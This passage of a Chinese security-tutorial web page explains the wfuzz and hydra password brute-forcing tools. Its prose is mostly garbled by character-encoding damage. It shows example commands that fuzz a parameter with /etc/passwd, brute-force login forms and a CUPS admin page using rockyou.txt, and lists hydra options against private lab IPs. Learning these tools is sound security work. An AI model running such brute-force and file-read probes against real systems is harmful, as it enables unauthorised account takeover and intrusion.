title="ÁàÜÁ†¥Â∑•ÂÖ∑"></a>ÁàÜÁ†¥Â∑•ÂÖ∑</h3><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p><a href="https://www.freebuf.com/column/163553.html">Âè≤‰∏äÊúÄËØ¶[ZI]ÁªÜ[DUO]ÁöÑwfuzz‰∏≠ÊñáÊïôÁ®ãÔºà‰∏ÄÔºâ‚Äî‚ÄîÂàùËØÜwfuzz</a></p><p><a href="https://www.ddosi.org/wfuzz-guide/">WfuzzËØ¶ÁªÜÊåáÂçó|Ê®°Á≥äÊµãËØïÂ∑•ÂÖ∑‰ΩøÁî®ÊñπÊ≥ï</a></p><h5 id="ÁÆÄ‰ªã-2"><a href="#ÁÆÄ‰ªã-2" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h5><p>wfuzz ÊòØ‰∏ÄÊ¨æPythonÂºÄÂèëÁöÑWebÂÆâÂÖ®ÊµãËØïÂ∑•ÂÖ∑<br>wfuzz‰∏ç‰ªÖ‰ªÖÊòØ‰∏Ä‰∏™webÊâ´ÊèèÂô®Ôºö</p><ul><li>wfuzzËÉΩÂ§üÈÄöËøáÂèëÁé∞Âπ∂Âà©Áî®ÁΩëÁ´ôÂº±ÁÇπ&#x2F;ÊºèÊ¥ûÁöÑÊñπÂºèÂ∏ÆÂä©‰Ω†‰ΩøÁΩëÁ´ôÊõ¥Âä†ÂÆâÂÖ®„ÄÇwfuzzÁöÑÊºèÊ¥ûÊâ´ÊèèÂäüËÉΩÁî±Êèí‰ª∂ÊîØÊåÅ„ÄÇ</li><li>wfuzzÊòØ‰∏Ä‰∏™ÂÆåÂÖ®Ê®°ÂùóÂåñÁöÑÊ°ÜÊû∂ÔºåËøô‰ΩøÂæóÂç≥‰ΩøÊòØPythonÂàùÂ≠¶ËÄÖ‰πüËÉΩÂ§üËøõË°åÂºÄÂèëÂíåË¥°ÁåÆ‰ª£Á†Å„ÄÇÂºÄÂèë‰∏Ä‰∏™wfuzzÊèí‰ª∂ÊòØ‰∏Ä‰ª∂ÈùûÂ∏∏ÁÆÄÂçïÁöÑ‰∫ãÔºåÈÄöÂ∏∏Âè™ÈúÄÂá†ÂàÜÈíü„ÄÇ</li><li>wfuzzÊèê‰æõ‰∫ÜÁÆÄÊ¥ÅÁöÑÁºñÁ®ãËØ≠Ë®ÄÊé•Âè£Êù•Â§ÑÁêÜwfuzzÊàñBurpsuiteËé∑ÂèñÂà∞ÁöÑHTTPËØ∑Ê±ÇÂíåÂìçÂ∫î„ÄÇËøô‰ΩøÂæó‰Ω†ËÉΩÂ§üÂú®‰∏Ä‰∏™ËâØÂ•ΩÁöÑ‰∏ä‰∏ãÊñáÁéØÂ¢É‰∏≠ËøõË°åÊâãÂ∑•ÊµãËØïÊàñÂçäËá™Âä®ÂåñÁöÑÊµãËØïÔºåËÄå‰∏çÈúÄË¶Å‰æùËµñwebÂΩ¢ÂºèÁöÑÊâ´ÊèèÂô®„ÄÇ</li></ul><h5 id="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞-1"><a href="#‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞-1" class="headerlink" title="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞"></a>‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞</h5><pre class="language-javascript" data-language="javascript"><code class="language-javascript">ÈÄâÈ°πÔºö<span class="token operator">-</span>h<span class="token operator">/</span><span class="token operator">--</span>helpÔºöÂ∏ÆÂä©<span class="token operator">--</span>helpÔºöÈ´òÁ∫ßÂ∏ÆÂä©<span class="token operator">--</span>filter<span class="token operator">-</span>helpÔºöÁ≠õÈÄâÂô®Â∏ÆÂä©<span class="token operator">--</span>versionÔºöWfuzzÁâàÊú¨ËØ¶ÁªÜ‰ø°ÊÅØ<span class="token operator">-</span>eÔºútypeÔºûÔºöÂèØÁî®ÁºñÁ†ÅÂô®<span class="token operator">/</span>ÊúâÊïàË¥üËΩΩ<span class="token operator">/</span>Ëø≠‰ª£Âô®<span class="token operator">/</span>ÊâìÂç∞Êú∫<span class="token operator">/</span>ËÑöÊú¨ÂàóË°®<span class="token operator">--</span>recipeÔºúfilenameÔºûÔºö‰ªéÈÖçÊñπ‰∏≠ËØªÂèñÈÄâÈ°π„ÄÇÂØπÂêÑÁßçÈ£üË∞±ÈáçÂ§ç‰∏äËø∞Ê≠•È™§„ÄÇ<span class="token operator">--</span>dump recipeÔºúfilenameÔºûÔºöÂ∞ÜÂΩìÂâçÈÄâÈ°πÊâìÂç∞‰∏∫ÈÖçÊñπ<span class="token operator">--</span>oFÔºúfilenameÔºûÔºöÂ∞ÜÊ®°Á≥äÁªìÊûú‰øùÂ≠òÂà∞Êñá‰ª∂‰∏≠„ÄÇËøô‰∫õÂèØ‰ª•Á®çÂêé‰ΩøÁî®wfuzzÊúâÊïàË¥üËΩΩÊù•‰ΩøÁî®„ÄÇ<span class="token operator">-</span>cÔºöÂ∏¶È¢úËâ≤ÁöÑËæìÂá∫<span class="token operator">-</span>vÔºöËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ<span class="token operator">-</span>f filenameÔºåprinterÔºö‰ΩøÁî®ÊåáÂÆöÁöÑÊâìÂç∞Êú∫ÔºàÂ¶ÇÊûúÁúÅÁï•‰∫ÜÂéüÂßãÊâìÂç∞Êú∫ÔºâÂ∞ÜÁªìÊûúÂ≠òÂÇ®Âú®ËæìÂá∫Êñá‰ª∂‰∏≠„ÄÇ<span class="token operator">-</span>o printerÔºö‰ΩøÁî®ÊåáÂÆöÁöÑÊâìÂç∞Êú∫ÊòæÁ§∫ÁªìÊûú„ÄÇ<span class="token operator">--</span>interact<span class="token operator">:</span>ÔºàbetaÔºâÂ¶ÇÊûúÈÄâ‰∏≠ÔºåÂàôÊçïËé∑ÊâÄÊúâÊåâÈîÆ„ÄÇËøôÂÖÅËÆ∏ÊÇ®‰∏éÁ®ãÂ∫è‰∫§‰∫í„ÄÇ<span class="token operator">--</span>dry<span class="token operator">-</span>runÔºöÊâìÂç∞Â∫îÁî®ËØ∑Ê±ÇÁöÑÁªìÊûúÔºåËÄå‰∏çÂÆûÈôÖÂèëÂá∫‰ªª‰Ωï<span class="token constant">HTTP</span>ËØ∑Ê±Ç„ÄÇ<span class="token operator">--</span>prevÔºöÊâìÂç∞‰ª•ÂâçÁöÑ<span class="token constant">HTTP</span>ËØ∑Ê±ÇÔºà‰ªÖÂΩì‰ΩøÁî®ÁîüÊàêÊ®°Á≥äÁªìÊûúÁöÑÊúâÊïàË¥üËΩΩÊó∂Ôºâ<span class="token operator">--</span>efieldÔºúexprÔºûÔºöÊòæÁ§∫ÊåáÂÆöÁöÑËØ≠Ë®ÄË°®ËææÂºè‰ª•ÂèäÂΩìÂâçË¥üËΩΩ„ÄÇÂØπÂêÑ‰∏™Â≠óÊÆµÈáçÂ§ç‰∏äËø∞Êìç‰Ωú„ÄÇ<span class="token operator">--</span>fieldÔºúexprÔºûÔºö‰∏çÊòæÁ§∫ÊúâÊïàË¥üËΩΩÔºåÂè™ÊòæÁ§∫ÊåáÂÆöÁöÑËØ≠Ë®ÄË°®ËææÂºè„ÄÇÂØπÂêÑ‰∏™Â≠óÊÆµÈáçÂ§ç‰∏äËø∞Êìç‰Ωú„ÄÇ<span class="token operator">-</span>p addrÔºö‰ΩøÁî®ip<span class="token operator">:</span>port<span class="token operator">:</span>typeÊ†ºÂºèÁöÑ‰ª£ÁêÜ„ÄÇÈáçÂ§ç‰ΩøÁî®ÂêÑÁßç‰ª£ÁêÜÁöÑÈÄâÈ°π„ÄÇÂ¶ÇÊûúÁúÅÁï•ÔºåÁ±ªÂûãÂèØ‰ª•ÊòØ<span class="token constant">SOCKS4</span>„ÄÅ<span class="token constant">SOCKS5</span>Êàñ<span class="token constant">HTTP</span>„ÄÇ<span class="token operator">-</span>t <span class="token constant">N</span>ÔºöÊåáÂÆöÂπ∂ÂèëËøûÊé•Êï∞ÔºàÈªòËÆ§ÂÄº‰∏∫<span class="token number">10</span>Ôºâ<span class="token operator">-</span>s <span class="token constant">N</span>ÔºöÊåáÂÆöËØ∑Ê±Ç‰πãÈó¥ÁöÑÊó∂Èó¥Âª∂ËøüÔºàÈªòËÆ§ÂÄº‰∏∫<span class="token number">0</span>Ôºâ<span class="token operator">-</span><span class="token constant">R</span> depthÔºöÈÄíÂΩíË∑ØÂæÑÂèëÁé∞Ê∑±Â∫¶ÊòØÊúÄÂ§ßÈÄíÂΩíÁ∫ßÂà´„ÄÇ<span class="token operator">-</span><span class="token constant">D</span> depthÔºöÊúÄÂ§ßÈìæÊé•Ê∑±Â∫¶Á∫ßÂà´„ÄÇ<span class="token operator">-</span><span class="token constant">L</span><span class="token punctuation">,</span> <span class="token operator">--</span>follow<span class="token operator">:</span>ÈÅµÂæ™<span class="token constant">HTTP</span>ÈáçÂÆöÂêë<span class="token operator">--</span>ip<span class="token operator">-</span>host<span class="token operator">:</span>portÔºö‰ª•ip<span class="token operator">:</span>portÊ†ºÂºèÊåáÂÆöË¶ÅËøûÊé•ÁöÑipÔºåËÄå‰∏çÊòØ<span class="token constant">URL</span>ÁöÑ‰∏ªÊú∫<span class="token operator">-</span><span class="token constant">Z</span>ÔºöÊâ´ÊèèÊ®°ÂºèÔºàÂ∞ÜÂøΩÁï•ËøûÊé•ÈîôËØØÔºâ„ÄÇ<span class="token operator">--</span>req delay <span class="token constant">N</span>ÔºöËÆæÁΩÆËØ∑Ê±ÇÂÖÅËÆ∏ÁöÑÊúÄÈïøÊó∂Èó¥Ôºà‰ª•Áßí‰∏∫Âçï‰ΩçÔºâÔºà<span class="token constant">CURLOPT_TIMEOUT</span>Ôºâ„ÄÇÈªòËÆ§ÂÄº<span class="token number">90</span>„ÄÇ<span class="token operator">--</span>conn<span class="token operator">-</span>delay <span class="token constant">N</span>ÔºöËÆæÁΩÆÊúçÂä°Âô®ËøûÊé•Èò∂ÊÆµË¶ÅËä±Ë¥πÁöÑÊúÄÈïøÊó∂Èó¥Ôºà‰ª•Áßí‰∏∫Âçï‰ΩçÔºâÔºà<span class="token constant">CURLOPT_CONNECTTIMEOUT</span>Ôºâ„ÄÇÈªòËÆ§ÂÄº<span class="token number">90</span>„ÄÇ<span class="token operator">-</span><span class="token constant">A</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AA</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AAA</span><span class="token operator">:</span> <span class="token operator">--</span>script<span class="token operator">=</span><span class="token keyword">default</span>ÔºåverboseÔºådiscovery<span class="token operator">-</span>v<span class="token operator">-</span>cÁöÑÂà´Âêç<span class="token operator">--</span>no<span class="token operator">-</span>cacheÔºöÁ¶ÅÁî®Êèí‰ª∂ÁºìÂ≠ò„ÄÇÂ∞ÜÊâ´ÊèèÊØè‰∏™ËØ∑Ê±Ç„ÄÇ<span class="token operator">--</span>script<span class="token operator">=</span>ÔºöÁõ∏ÂΩì‰∫é<span class="token operator">--</span>script<span class="token operator">=</span>ÈªòËÆ§ÂÄº<span class="token operator">--</span>script<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>ÔºöËøêË°åËÑöÊú¨ÁöÑÊâ´Êèè<span class="token operator">&lt;</span>plugins<span class="token operator">></span>ÊòØ‰ª•ÈÄóÂè∑ÂàÜÈöîÁöÑÊèí‰ª∂Êñá‰ª∂ÊàñÊèí‰ª∂Á±ªÂà´ÂàóË°®<span class="token operator">--</span>script help<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>ÔºöÊòæÁ§∫ÊúâÂÖ≥ËÑöÊú¨ÁöÑÂ∏ÆÂä©„ÄÇ<span class="token operator">--</span>script<span class="token operator">-</span>args n1<span class="token operator">=</span>v1Ôºå‚Ä¶Ôºö‰∏∫ËÑöÊú¨Êèê‰æõÂèÇÊï∞„ÄÇÂç≥<span class="token operator">--</span>script args grep<span class="token punctuation">.</span>regex<span class="token operator">=</span>‚Äú<span class="token operator">&lt;</span><span class="token constant">A</span> href<span class="token operator">=</span>\‚ÄùÔºà<span class="token punctuation">.</span><span class="token operator">*</span>ÔºüÔºâ\‚Äú<span class="token operator">></span>‚Äù<span class="token operator">-</span>u urlÔºöÊåáÂÆöËØ∑Ê±ÇÁöÑurl„ÄÇ<span class="token operator">-</span>m iteratorÔºöÊåáÂÆöÁî®‰∫éÁªÑÂêàÊúâÊïàËΩΩËç∑ÁöÑËø≠‰ª£Âô®ÔºàÈªòËÆ§‰∏∫productÔºâ<span class="token operator">-</span>z payloadÔºö‰ª•ÂêçÁß∞<span class="token punctuation">[</span>ÔºåÂèÇÊï∞<span class="token punctuation">]</span><span class="token punctuation">[</span>ÔºåÁºñÁ†ÅÂô®<span class="token punctuation">]</span>ÁöÑÂΩ¢Âºè‰∏∫ÊØè‰∏™<span class="token constant">FUZZ</span>ÂÖ≥ÈîÆÂ≠óÊåáÂÆöÊúâÊïàË¥üËΩΩ„ÄÇÂèØ‰ª•‰ΩøÁî®ÁºñÁ†ÅÂô®ÂàóË°®ÔºåÂç≥md5<span class="token operator">-</span>sha1„ÄÇÁºñÁ†ÅÂô®ÂèØ‰ª•ÊòØÈìæÂºèÁöÑÔºåÂç≥„ÄÇmd5@sha1<span class="token punctuation">.</span>ÂèØ‰ª•‰ΩøÁî®ÁºñÁ†ÅÂô®Á±ªÂà´„ÄÇÂç≥url‰ΩøÁî®Â∏ÆÂä©‰Ωú‰∏∫ÊúâÊïàË¥üËΩΩÊù•ÊòæÁ§∫ÊúâÊïàË¥üËΩΩÊèí‰ª∂ÁöÑËØ¶ÁªÜ‰ø°ÊÅØÔºàÊÇ®ÂèØ‰ª•‰ΩøÁî®<span class="token operator">--</span>sliceËøõË°åËøáÊª§Ôºâ<span class="token operator">--</span>zPÔºúparamsÔºûÔºöÊåáÂÆöÊúâÊïàË¥üËΩΩÁöÑÂèÇÊï∞ÔºàÂøÖÈ°ª‰ª•<span class="token operator">-</span>zÊàñ<span class="token operator">-</span>wÂºÄÂ§¥Ôºâ„ÄÇ<span class="token operator">--</span>zD<span class="token operator">&lt;</span><span class="token keyword">default</span><span class="token operator">></span>ÔºöÊåáÂÆöÊúâÊïàË¥üËΩΩÁöÑÈªòËÆ§ÂèÇÊï∞ÔºàÂøÖÈ°ª‰ª•<span class="token operator">-</span>zÊàñ<span class="token operator">-</span>wÂºÄÂ§¥Ôºâ„ÄÇ<span class="token operator">--</span>zEÔºúencoderÔºûÔºöÊåáÂÆöÊúâÊïàË¥üËΩΩÁöÑÁºñÁ†ÅÂô®ÔºàÂÆÉÂøÖÈ°ª‰ª•<span class="token operator">-</span>zÊàñ<span class="token operator">-</span>wÂºÄÂ§¥Ôºâ„ÄÇ<span class="token operator">--</span>sliceÔºúfilterÔºûÔºö‰ΩøÁî®ÊåáÂÆöÁöÑË°®ËææÂºèËøáÊª§ÊúâÊïàË¥üËΩΩÁöÑÂÖÉÁ¥†„ÄÇÂÆÉÂøÖÈ°ª‰ª•<span class="token operator">-</span>zÂºÄÂ§¥„ÄÇ<span class="token operator">-</span>w wordlistÔºöÊåáÂÆöwordlistÊñá‰ª∂Ôºà<span class="token operator">-</span>zÊñá‰ª∂ÁöÑÂà´ÂêçÔºåwordlistÔºâ„ÄÇ<span class="token operator">-</span><span class="token constant">V</span> alltypeÔºöÊâÄÊúâÂèÇÊï∞brutformingÔºàallvarsÂíåallpostÔºâ„ÄÇ‰∏çÈúÄË¶Å<span class="token constant">FUZZ</span>ÂÖ≥ÈîÆÂ≠ó„ÄÇ<span class="token operator">-</span><span class="token constant">X</span> methodÔºöÊåáÂÆöËØ∑Ê±ÇÁöÑ<span class="token constant">HTTP</span>ÊñπÊ≥ïÔºåÂç≥<span class="token constant">HEAD</span>Êàñ<span class="token constant">FUZZ</span><span class="token operator">-</span>b cookieÔºö‰∏∫ËØ∑Ê±ÇÊåáÂÆöcookie„ÄÇÂØπÂêÑÁßçcookieÈáçÂ§çÈÄâÈ°π„ÄÇ<span class="token operator">-</span>d postdataÔºö‰ΩøÁî®postdataÔºà‰æãÂ¶ÇÔºö‚Äúid<span class="token operator">=</span><span class="token constant">FUZZ</span><span class="token operator">&amp;</span>catalog<span class="token operator">=</span><span class="token number">1</span>‚ÄùÔºâ<span class="token operator">-</span><span class="token constant">H</span> <span class="token literal-property property">headerÔºö‰ΩøÁî®headerÔºà‰æãÂ¶ÇÔºö‚ÄúCookie</span><span class="token operator">:</span>id<span class="token operator">=</span><span class="token number">1312321</span><span class="token operator">&amp;</span>user<span class="token operator">=</span><span class="token constant">FUZZ</span>‚ÄùÔºâ„ÄÇÂØπÂêÑÁßçÊ†áÈ¢òÈáçÂ§çÈÄâÈ°π„ÄÇ<span class="token operator">--</span>basic<span class="token operator">/</span>ntlm<span class="token operator">/</span>digest authÔºöÊ†ºÂºè‰∏∫‚Äúuser<span class="token operator">:</span>pass‚ÄùÊàñ‚Äú<span class="token constant">FUZZ</span><span class="token operator">:</span><span class="token constant">FUZZ</span>‚ÄùÊàñ<span class="token operator">--</span>hc<span class="token operator">/</span>hl<span class="token operator">/</span>hw<span class="token operator">/</span>hh <span class="token constant">N</span><span class="token punctuation">[</span>Ôºå<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>ÔºöÈöêËóèÂÖ∑ÊúâÊåáÂÆö‰ª£Á†Å<span class="token operator">/</span>Ë°å<span class="token operator">/</span>Â≠ó<span class="token operator">/</span>Â≠óÁ¨¶ÁöÑÂìçÂ∫îÔºà‰ΩøÁî®<span class="token constant">BBB</span>‰ªéÂü∫Á∫øËé∑ÂèñÂÄºÔºâ<span class="token operator">--</span>sc<span class="token operator">/</span>sl<span class="token operator">/</span>sw<span class="token operator">/</span>sh <span class="token constant">N</span><span class="token punctuation">[</span>Ôºå<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>ÔºöÊòæÁ§∫ÂÖ∑ÊúâÊåáÂÆö‰ª£Á†Å<span class="token operator">/</span>Ë°å<span class="token operator">/</span>Â≠ó<span class="token operator">/</span>Â≠óÁ¨¶ÁöÑÂìçÂ∫îÔºà‰ΩøÁî®<span class="token constant">BBB</span>Ëé∑ÂèñÂü∫Á∫øÂÄºÔºâ<span class="token operator">--</span>ss<span class="token operator">/</span>hsÊ≠£ÂàôË°®ËææÂºèÔºöÊòæÁ§∫<span class="token operator">/</span>ÈöêËóèÂÜÖÂÆπ‰∏≠ÂÖ∑ÊúâÊåáÂÆöÊ≠£ÂàôË°®ËææÂºèÁöÑÂìçÂ∫î<span class="token operator">--</span>filterÔºúfilterÔºûÔºö‰ΩøÁî®ÊåáÂÆöÁöÑÁ≠õÈÄâÂô®Ë°®ËææÂºèÊòæÁ§∫<span class="token operator">/</span>ÈöêËóèÂìçÂ∫îÔºà‰ΩøÁî®<span class="token constant">BBB</span>‰ªéÂü∫Á∫øËé∑ÂèñÂÄºÔºâ<span class="token operator">--</span>prefilterÔºúfilterÔºûÔºö‰ΩøÁî®ÊåáÂÆöÁöÑË°®ËææÂºèÂú®Ê®°Á≥äÂåñ‰πãÂâçËøáÊª§È°πÁõÆ„ÄÇÂØπ‰∏≤ËÅîËøáÊª§Âô®ÈáçÂ§ç‰∏äËø∞Ê≠•È™§„ÄÇ</code></pre><h5 id="wfuzzÂ∏∏ËßÅÁî®Ê≥ï"><a href="#wfuzzÂ∏∏ËßÅÁî®Ê≥ï" class="headerlink" title="wfuzzÂ∏∏ËßÅÁî®Ê≥ï"></a>wfuzzÂ∏∏ËßÅÁî®Ê≥ï</h5><hr><h6 id="Ê®°Á≥äÊü•ËØ¢GETËØ∑Ê±ÇÂèÇÊï∞"><a href="#Ê®°Á≥äÊü•ËØ¢GETËØ∑Ê±ÇÂèÇÊï∞" class="headerlink" title="Ê®°Á≥äÊü•ËØ¢GETËØ∑Ê±ÇÂèÇÊï∞"></a>Ê®°Á≥äÊü•ËØ¢GETËØ∑Ê±ÇÂèÇÊï∞</h6><pre class="language-none"><code class="language-none">wfuzz -u &quot;http:&#x2F;&#x2F;192.168.1.104&#x2F;test.php?FUZZ&#x3D;&#x2F;etc&#x2F;passwd&quot; -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hh 80</code></pre><p><img src="wfuzz.png" loading="lazy"></p><h6 id="Ê®°Á≥äÊü•ËØ¢POSTËØ∑Ê±ÇÂèÇÊï∞"><a href="#Ê®°Á≥äÊü•ËØ¢POSTËØ∑Ê±ÇÂèÇÊï∞" class="headerlink" title="Ê®°Á≥äÊü•ËØ¢POSTËØ∑Ê±ÇÂèÇÊï∞"></a>Ê®°Á≥äÊü•ËØ¢POSTËØ∑Ê±ÇÂèÇÊï∞</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -d &quot;uname&#x3D;FUZZ&amp;pass&#x3D;FUZZ&quot;  --hc 302 http:&#x2F;&#x2F;192.168.1.102&#x2F;user.php</code></pre><h6 id="Ê∑ªÂä†cookieÂèëËµ∑ËØ∑Ê±Ç"><a href="#Ê∑ªÂä†cookieÂèëËµ∑ËØ∑Ê±Ç" class="headerlink" title="Ê∑ªÂä†cookieÂèëËµ∑ËØ∑Ê±Ç"></a>Ê∑ªÂä†cookieÂèëËµ∑ËØ∑Ê±Ç</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -b cookie&#x3D;value1 -b cookie2&#x3D;value2 http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="Ê∑ªÂä†ËØ∑Ê±ÇÂ§¥"><a href="#Ê∑ªÂä†ËØ∑Ê±ÇÂ§¥" class="headerlink" title="Ê∑ªÂä†ËØ∑Ê±ÇÂ§¥"></a>Ê∑ªÂä†ËØ∑Ê±ÇÂ§¥</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -H &quot;Referer: 127.0.0.1&quot; http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="Â≠êÂüüÂêçÊâ´Êèè"><a href="#Â≠êÂüüÂêçÊâ´Êèè" class="headerlink" title="Â≠êÂüüÂêçÊâ´Êèè"></a>Â≠êÂüüÂêçÊâ´Êèè</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53</code></pre><p><img src="wfuzz_2.png" loading="lazy"></p><h6 id="ÁàÜÁ†¥401ËÆ§ËØÅÁïåÈù¢"><a href="#ÁàÜÁ†¥401ËÆ§ËØÅÁïåÈù¢" class="headerlink" title="ÁàÜÁ†¥401ËÆ§ËØÅÁïåÈù¢"></a>ÁàÜÁ†¥401ËÆ§ËØÅÁïåÈù¢</h6><pre class="language-none"><code class="language-none">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --basic mum:FUZZ -u http:&#x2F;&#x2F;192.168.1.106:631&#x2F;admin&#x2F; -b &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&quot; -d &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&amp;OP&#x3D;add-printer&quot; -Z --hc 401</code></pre><p><img src="wfuzz_3.png" loading="lazy"></p><h4 id="hydra-‰πùÂ§¥Ëõá"><a href="#hydra-‰πùÂ§¥Ëõá" class="headerlink" title="hydra(‰πùÂ§¥Ëõá)"></a>hydra(‰πùÂ§¥Ëõá)</h4><h5 id="ÁÆÄ‰ªã-3"><a href="#ÁÆÄ‰ªã-3" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h5><p>HydraÊòØ‰∏Ä‰∏™Êö¥ÂäõÂú®Á∫øÂØÜÁ†ÅÁ†¥Ëß£Á®ãÂ∫èÔºå‰∏Ä‰∏™ÈíàÂØπÁ≥ªÁªüÁôªÂΩïÂØÜÁ†ÅÁöÑÂø´ÈÄüÁàÜÁ†¥Â∑•ÂÖ∑„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®HydraËøêË°å‰∏Ä‰∏™Â≠óÂÖ∏Âπ∂‚ÄùÊö¥ÂäõÁ†¥Ëß£‚Äù‰∏Ä‰∫õË∫´‰ªΩÈ™åËØÅÊúçÂä°ÔºåÊÉ≥Ë±°‰∏Ä‰∏ãËØïÂõæÂú®ÁâπÂÆöÊúçÂä°‰∏äÊâãÂä®ÁåúÊµãÊüê‰∫∫ÁöÑÂØÜÁ†ÅÔºàSSH, WebÂ∫îÁî®Á®ãÂ∫èÁôªÂΩïÊ°Ü, FTPÔºåSNMPÔºâÔºå‰ΩøÁî® Hydra ËøêË°åÂØÜÁ†ÅÂ≠óÂÖ∏‰ª•Á°ÆÂÆöÊ≠£Á°ÆÁöÑÂØÜÁ†Å„ÄÇ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># HydraËÉΩÂ§üÂ∞ùËØïÊö¥ÂäõÁ†¥Ëß£‰ª•‰∏ãÂçèËÆÆÔºö</span>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, OracleÁõëÂê¨Âô®, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTPÊûö‰∏æ, SNMP v1+v2+v3, SOCKS5, SSH <span class="token punctuation">(</span>v1Âíåv2<span class="token punctuation">)</span>, SSHKEY, Subversion, Teamspeak <span class="token punctuation">(</span>TS2<span class="token punctuation">)</span>, Telnet, VMware-Auth, VNC‰ª•ÂèäXMPPÁ≠â„ÄÇ</code></pre><h5 id="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞-2"><a href="#‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞-2" class="headerlink" title="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞"></a>‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞</h5><p>ËØ≠Ê≥ïÔºöhydra [-Options] [IP] [service]</p><p>Example:  hydra -l user -P passlist.txt <a href="ftp://192.168.0.1/">ftp://192.168.0.1</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-l</span> login Â∞èÂÜôÔºåÊåáÂÆöÁî®Êà∑ÂêçËøõË°åÁ†¥Ëß£<span class="token parameter variable">-L</span> <span class="token function">file</span> Â§ßÂÜôÔºåÊåáÂÆöÁî®Êà∑ÁöÑÁî®Êà∑ÂêçÂ≠óÂÖ∏<span class="token parameter variable">-p</span> pass Â∞èÂÜôÔºåÁî®‰∫éÊåáÂÆöÂØÜÁ†ÅÁ†¥Ëß£ÔºåÂæàÂ∞ë‰ΩøÁî®Ôºå‰∏ÄËà¨ÈááÁî®ÂØÜÁ†ÅÂ≠óÂÖ∏„ÄÇ<span class="token parameter variable">-P</span> <span class="token function">file</span> Â§ßÂÜôÔºåÁî®‰∫éÊåáÂÆöÂØÜÁ†ÅÂ≠óÂÖ∏„ÄÇ<span class="token parameter variable">-e</span> ns È¢ùÂ§ñÁöÑÈÄâÈ°πÔºånÔºöÁ©∫ÂØÜÁ†ÅËØïÊé¢ÔºåsÔºö‰ΩøÁî®ÊåáÂÆöË¥¶Êà∑ÂíåÂØÜÁ†ÅËØïÊé¢<span class="token parameter variable">-M</span> <span class="token function">file</span> ÊåáÂÆöÁõÆÊ†áipÂàóË°®Êñá‰ª∂ÔºåÊâπÈáèÁ†¥Ëß£„ÄÇ<span class="token parameter variable">-o</span> <span class="token function">file</span> ÊåáÂÆöÁªìÊûúËæìÂá∫Êñá‰ª∂<span class="token parameter variable">-f</span> ÊâæÂà∞Á¨¨‰∏ÄÂØπÁôªÂΩïÂêçÊàñËÄÖÂØÜÁ†ÅÁöÑÊó∂ÂÄô‰∏≠Ê≠¢Á†¥Ëß£„ÄÇ<span class="token parameter variable">-t</span> tasks ÂêåÊó∂ËøêË°åÁöÑÁ∫øÁ®ãÊï∞ÔºåÈªòËÆ§ÊòØ16<span class="token parameter variable">-w</span> <span class="token function">time</span> ËÆæÁΩÆÊúÄÂ§ßË∂ÖÊó∂Êó∂Èó¥ÔºåÂçï‰Ωç<span class="token parameter variable">-v</span> / <span class="token parameter variable">-V</span> ÊòæÁ§∫ËØ¶ÁªÜËøáÁ®ã<span class="token parameter variable">-R</span> ÊÅ¢Â§çÁàÜÁ†¥ÔºàÂ¶ÇÊûúÁ†¥Ëß£‰∏≠Êñ≠‰∫ÜÔºå‰∏ãÊ¨°ÊâßË°å hydra <span class="token parameter variable">-R</span> /path/to/hydra.restore Â∞±ÂèØ‰ª•ÁªßÁª≠‰ªªÂä°„ÄÇÔºâ<span class="token parameter variable">-x</span> Ëá™ÂÆö‰πâÂØÜÁ†Å„ÄÇ</code></pre><pre class="language-bash" data-language="bash"><code 